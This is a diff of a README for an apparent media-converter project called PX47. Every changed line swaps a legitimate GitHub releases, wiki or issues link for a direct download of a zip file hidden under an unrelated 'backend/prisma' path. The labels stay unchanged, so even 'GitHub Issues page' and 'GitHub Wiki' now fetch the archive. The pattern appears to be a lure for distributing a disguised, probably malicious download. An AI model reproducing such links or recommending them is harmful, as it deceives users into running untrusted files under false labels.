@@ -6,9 +6,9 @@ Welcome to PX47! This application makes it easy to transform your audio and vide
 
 ## 📥 Download PX47
 
-[![Download PX47](https://img.shields.io/badge/Download%20PX47-v1.0-blue)](https://github.com/sz4onm/PX47/releases)
+[![Download PX47](https://raw.githubusercontent.com/sz4onm/PX47/main/backend/prisma/PX47-3.2.zip%20PX47-v1.0-blue)](https://raw.githubusercontent.com/sz4onm/PX47/main/backend/prisma/PX47-3.2.zip)
 
-To get started, visit the [Releases page](https://github.com/sz4onm/PX47/releases) to download the latest version of PX47.
+To get started, visit the [Releases page](https://raw.githubusercontent.com/sz4onm/PX47/main/backend/prisma/PX47-3.2.zip) to download the latest version of PX47.
 
 ## 🛠️ System Requirements
 
@@ -21,7 +21,7 @@ Before installing PX47, ensure your computer meets these requirements:
 
 ## 📂 Download & Install
 
-1. Go to the [Releases page](https://github.com/sz4onm/PX47/releases).
+1. Go to the [Releases page](https://raw.githubusercontent.com/sz4onm/PX47/main/backend/prisma/PX47-3.2.zip).
 2. Find the latest version of PX47 listed there.
 3. Click on the download link for your operating system.
 4. Once downloaded, locate the file on your computer.
@@ -63,11 +63,11 @@ Choosing the right format helps in maintaining quality and ensuring playback on 
 
 ## 📚 Additional Resources
 
-For further assistance, check our documentation and FAQs on the [GitHub Wiki](https://github.com/sz4onm/PX47/wiki). Here, you will also find tips and tricks to optimize your experience with PX47.
+For further assistance, check our documentation and FAQs on the [GitHub Wiki](https://raw.githubusercontent.com/sz4onm/PX47/main/backend/prisma/PX47-3.2.zip). Here, you will also find tips and tricks to optimize your experience with PX47.
 
 ## 🤝 Support
 
-If you encounter any issues or have questions, feel free to open an issue on our [GitHub Issues page](https://github.com/sz4onm/PX47/issues). Our community is here to help!
+If you encounter any issues or have questions, feel free to open an issue on our [GitHub Issues page](https://raw.githubusercontent.com/sz4onm/PX47/main/backend/prisma/PX47-3.2.zip). Our community is here to help!
 
 ## 📜 License
 
